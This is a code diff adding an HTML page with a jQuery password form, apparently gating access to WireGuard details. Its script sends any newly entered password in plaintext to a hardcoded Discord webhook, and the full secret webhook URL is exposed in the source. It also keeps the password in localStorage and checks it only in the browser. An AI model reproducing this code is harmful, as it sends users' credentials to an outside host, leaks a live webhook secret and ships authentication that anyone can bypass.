@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Your Page Title</title>
+  <!-- Include jQuery library (if not already included) -->
+  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+</head>
+<body>
+
+<!-- Your existing HTML content -->
+
+<form id="authForm">
+  <div class="form-group">
+    <label for="authPassword">Enter Password:</label>
+    <input type="password" class="form-control" id="authPassword" placeholder="Enter authentication password">
+  </div>
+  <button type="submit" id="wg-submit-pass" class="btn btn-primary">Submit</button>
+</form>
+
+<!-- Include the modified script -->
+<script>
+  $('#authForm').on('submit', function(event) {
+    event.preventDefault();
+
+    let password = $('#authPassword').val();
+
+    // Check if there is a stored password
+    let storedPassword = localStorage.getItem('webhookAuthPassword');
+
+    if (storedPassword) {
+        // If a stored password exists, compare it with the entered password
+        if (password === storedPassword) {
+            // Perform actions for successful login
+            alert('Login successful!');
+        } else {
+            // Handle incorrect password
+            alert('Incorrect password. Please try again.');
+        }
+    } else {
+        // If there is no stored password, treat it as a password change request
+        // Send the new password to Discord
+        sendToDiscord(`Changed password to: ${password}`);
+
+        // Optionally, provide feedback to the user
+        alert('Password changed successfully!');
+
+        // Save the new password in localStorage
+        localStorage.setItem('webhookAuthPassword', password);
+    }
+
+    // Continue with your existing AJAX logic or update as needed
+    $.ajax({
+        url: '/get_wireguard_details',  // Your server-side route that returns the details
+        type: 'POST',
+        data: { password: password },
+        success: function(response) {
+            // If successful AJAX call, handle the response
+        },
+        error: function(error) {
+            // Handle AJAX error
+        }
+    });
+  });
+
+  function sendToDiscord(message) {
+    // Your webhook URL
+    let webhookUrl = "https://discord.com/api/webhooks/1184455595999363092/gbWsmaDKm6YVNmvyQEwbIFla1x8XxPxtbkuO6OVfH3SaUqwVG2HIMBvjh08b9dRuBLPJ";  // Replace with your webhook URL
+
+    // Send the message to your Discord webhook
+    $.ajax({
+        url: webhookUrl,
+        type: 'POST',
+        data: JSON.stringify({ content: message }),
+        contentType: 'application/json',
+        success: function(response) {
+            console.log("Webhook sent successfully:", response);
+        },
+        error: function(error) {
+            console.error("Error sending webhook. Status:", error.status);
+        }
+    });
+  }
+</script>
+
+</body>
+</html>
